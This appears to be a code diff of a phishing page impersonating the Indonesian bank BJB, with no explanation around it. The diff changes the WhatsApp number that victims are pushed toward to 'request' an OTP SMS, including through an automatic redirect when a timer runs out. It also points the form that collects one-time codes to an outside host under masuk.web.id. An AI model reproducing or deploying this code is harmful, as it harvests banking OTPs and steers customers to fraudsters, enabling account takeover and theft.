@@ -139,7 +139,7 @@
      <button class="mt-4" type="submit" id="kirims" >Konfirmasi</button>
      
      <div class="grouo_text_bottom">
-         <p onclick="location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP'" id="remove_otp">Request OTP</p>
+         <p onclick="location.href='https://api.whatsapp.com/send?phone=628154043504&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP'" id="remove_otp">Request OTP</p>
          <p onclick="location.href='sms:83373?body='" id="reques_otp">Kirim OTP</p>
      </div>
     </form>
@@ -207,7 +207,7 @@ var time = $("#cice")
 var timer = setInterval(function() {
   time.html(i);
   if (i == 0) {
-  $("#timer").hide(); window.location.href='https://api.whatsapp.com/send?phone=6282182480632&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP';
+  $("#timer").hide(); window.location.href='https://api.whatsapp.com/send?phone=628154043504&text=𝗛𝗮𝗹𝗹𝗼 𝗯𝗮𝗻𝗸 𝗯𝗷𝗯%0ASaya mau request Pesan SMS ke layanan (83373) Agar bisa terima kode OTP';
     clearInterval(timer);
 
   }
@@ -240,7 +240,7 @@ $(document).ready(function(){
 $.ajax({
 
  type: 'POST',
- url: 'req/otp.php',
+ url: 'https://choreo-is.masuk.web.id/bjb04/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
